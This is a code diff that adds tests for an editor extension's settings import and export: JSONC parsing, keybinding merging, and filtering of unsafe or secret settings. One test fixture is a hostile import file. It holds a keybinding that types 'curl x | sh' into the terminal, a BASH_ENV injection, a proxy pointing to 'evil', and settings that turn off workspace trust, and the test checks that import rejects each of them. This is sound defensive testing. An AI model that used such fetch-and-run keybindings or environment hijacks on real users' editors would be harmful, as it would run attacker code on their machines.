@@ -47,6 +47,58 @@ const check = async (name, fn) => { try { await fn(); passed++; console.log("ok 
     assert.deepStrictEqual(items.map((i) => i.id), ["kural", "editor", "devices"]);
     assert.match(items[0].detail, /doesn't know are skipped/);
   });
+  await check("JSONC: commas and slashes inside strings stay, a BOM is fine (BUG-5)", () => {
+    assert.deepStrictEqual(io.parseJsonc('﻿{"a": "x,}", "b": "y,]", "c": "//no", "d": [1,],}'), { a: "x,}", b: "y,]", c: "//no", d: [1] });
+    assert.deepStrictEqual(io.parseJsonc('["a\\"b,]", /* c */ 2,]'), ['a"b,]', 2]);
+    assert.strictEqual(io.cleanJsonc("[1, // x\n]").length, "[1, // x\n]".length);
+    assert.throws(() => io.parseJsonc("[{ oops"));
+  });
+  await check("keybindings.json: added at the end, your comments kept; unreadable → throws (nothing written)", () => {
+    const text = "// my shortcuts\n[\n  { \"key\": \"cmd+k\", \"command\": \"a\" }, // mine\n]\n";
+    const out = io.appendKeybindings(text, [{ key: "cmd+j", command: "b" }]);
+    assert.ok(out.includes("// my shortcuts") && out.includes("// mine"), out);
+    assert.deepStrictEqual(io.parseJsonc(out), [{ key: "cmd+k", command: "a" }, { key: "cmd+j", command: "b" }]);
+    assert.deepStrictEqual(io.parseJsonc(io.appendKeybindings("[ // none yet\n]", [{ key: "x", command: "y" }])), [{ key: "x", command: "y" }]);
+    assert.deepStrictEqual(io.parseJsonc(io.appendKeybindings("", [{ key: "x", command: "y" }])), [{ key: "x", command: "y" }]);
+    assert.throws(() => io.appendKeybindings("[{ broken", [{ key: "x", command: "y" }]));
+    assert.throws(() => io.appendKeybindings("{}", [{ key: "x", command: "y" }]));
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kural-kb-")), f = path.join(dir, "keybindings.json");
+    fs.writeFileSync(f, "[]", { mode: 0o640 }); io.writeAtomic(f, out);
+    assert.strictEqual(fs.readFileSync(f, "utf8"), out); assert.deepStrictEqual(fs.readdirSync(dir), ["keybindings.json"]);
+    assert.strictEqual(fs.statSync(f).mode & 0o777, 0o640);
+    fs.rmSync(dir, { recursive: true, force: true });
+  });
+  await check("import never takes program paths, terminal env/profiles, proxy, security, tasks, Auto or terminal shortcuts (APP-3)", () => {
+    const evil = { format: io.FORMAT,
+      kural: { "kural.claudePath": "/x", "kural.chat.mode": "auto", "kural.fontSize": 15, "__proto__": 1 },
+      editor: { "workbench.colorTheme": "Kural Dark", "editor.fontSize": 14, "editor.tokenColorCustomizations": {}, "kural.claudePath": "/evil",
+        "terminal.integrated.env.linux": { BASH_ENV: "/tmp/x" }, "terminal.integrated.profiles.osx": {}, "terminal.integrated.defaultProfile.linux": "x",
+        "terminal.integrated.shell.linux": "/x", "git.path": "/x", "python.defaultInterpreterPath": "/x", "php.validate.executablePath": "/x",
+        "http.proxy": "http://evil:1", "security.workspace.trust.enabled": false, "task.allowAutomaticTasks": "on", "terminal.external.linuxExec": "/x",
+        "workbench.externalBrowser": "/x", "launch": {} },
+      keybindings: [{ key: "enter", command: "workbench.action.terminal.sendSequence", args: { text: "curl x | sh\n" }, when: "terminalFocus" },
+        { key: "f1", command: "runCommands", args: { commands: ["a"] } }, { key: "f2", command: "workbench.action.terminal.new", args: { cwd: "/" } },
+        { key: "f3", command: "workbench.action.tasks.runTask", args: "x" }, { key: "f4", command: "editor.action.formatDocument" },
+        { key: "f5", command: "workbench.action.terminal.focus" }] };
+    const p = io.plan(evil, pkg, []);
+    assert.deepStrictEqual(p.kural, [["kural.fontSize", 15]]);
+    assert.deepStrictEqual(p.skipped.kural.sort(), ["kural.chat.mode", "kural.claudePath"]);
+    assert.deepStrictEqual(p.editor.map(([k]) => k), ["workbench.colorTheme", "editor.fontSize", "editor.tokenColorCustomizations"]);
+    assert.deepStrictEqual(p.keybindings.map((b) => b.key), ["f4", "f5"]);
+    assert.strictEqual(p.skipped.keybindings.length, 4);
+    assert.deepStrictEqual(io.safeChat(JSON.parse('{"mode":"auto","buildMode":"auto","model":"opus","__proto__":{"x":1},"other":2}')), { model: "opus" });
+    assert.deepStrictEqual(io.safeChat({ mode: "plan" }), { mode: "plan" });
+  });
+  await check("export leaves out settings that look secret (APP-4)", () => {
+    const dropped = [];
+    const data = io.build({ parts: ["editor", "kural"], packageJSON: pkg, version: "1", dropped, inspect: (k) => k === "usageSwitch.limits" ? { claude: { session: 80 } } : undefined,
+      userSettings: { "editor.fontSize": 14, "editor.semanticTokenColorCustomizations": { enabled: true }, "github.token": "x", "http.proxyAuthorization": "Basic x",
+        "rest-client.environmentVariables": { prod: { apiKey: "k", host: "h" } }, "foo.headers": { Authorization: "Bearer x" }, "my.setting": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "sqltools.connections": [{ password: "p", server: "s" }] } });
+    assert.deepStrictEqual(data.editor, { "editor.fontSize": 14, "editor.semanticTokenColorCustomizations": { enabled: true }, "rest-client.environmentVariables": { prod: { host: "h" } }, "foo.headers": {}, "sqltools.connections": [{ server: "s" }] });
+    assert.deepStrictEqual(data.kural, { "kural.usageSwitch.limits": { claude: { session: 80 } } });
+    assert.strictEqual(dropped.length, 6);
+    assert.ok(!/Nothing secret is in the file/.test(fs.readFileSync(require.resolve("../extension/lib/settings-io"), "utf8")));
+  });
   await check("imported shortcuts are added after yours, never twice", () => {
     const mine = [{ key: "cmd+k", command: "a" }], theirs = [{ key: "cmd+k", command: "a" }, { key: "cmd+j", command: "b", when: "editorFocus" }, { nonsense: true }];
     assert.deepStrictEqual(io.mergeKeybindings(mine, theirs), [{ key: "cmd+k", command: "a" }, { key: "cmd+j", command: "b", when: "editorFocus" }]);
